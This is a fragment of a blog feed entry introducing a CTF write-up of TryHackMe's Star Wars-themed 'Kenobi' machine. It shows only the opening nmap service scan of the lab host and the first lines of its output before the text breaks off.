+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36 UTC&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/kenobi-ctf-write-up/</link><guid isPermaLink="false">5e8c661f75832c27370ae6ca</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 11:40:35 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/Animated-GIF-downsized_large.gif" alt="Kenobi | CTF write-up"&gt;&lt;p&gt;today's CTF we will cover a Kenobi made by www.tryhackme.com the theme of the machine is star-wars  ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/9gISqB3tncMmY" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cat-star-wars-9gISqB3tncMmY"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Let's enumerate this machine and see what we're dealing with&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.68.87
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 11:36 UTC
 Nmap scan report for ip-10-10-68-87.eu-west-1.compute.internal (10.10.68.87)
 Host is up (0.00093s latency).
